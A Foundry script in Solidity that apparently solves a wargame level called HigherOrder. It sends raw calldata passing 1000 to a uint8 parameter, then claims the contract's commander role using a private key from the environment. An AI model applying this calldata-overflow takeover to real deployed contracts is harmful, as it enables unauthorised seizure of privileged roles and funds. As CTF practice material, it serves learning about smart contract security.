// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/30-HigherOrder.sol";


contract Exp is Script {
    HigherOrder public higherOrderInstance = HigherOrder(payable(0xf43a5eE4D74c82359f866796Ba2d31c8411fCdd2));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");


    // function attack() public {


    // }
    
    function run() external {
        vm.startBroadcast(hacker);

        bytes memory payload = abi.encodeWithSignature(
            "registerTreasury(uint8)",
            uint256(1000)  // 使用一个大于255的值
        );
        
        (bool success, ) = address(higherOrderInstance).call(payload);
        require(success, "Register treasury failed");
        
        higherOrderInstance.claimLeadership();
        
        console.log("New commander address:", higherOrderInstance.commander());
        console.log("Hacker address:", hacker);
        require(higherOrderInstance.commander() == hacker, "Attack failed");

        vm.stopBroadcast();
    }
}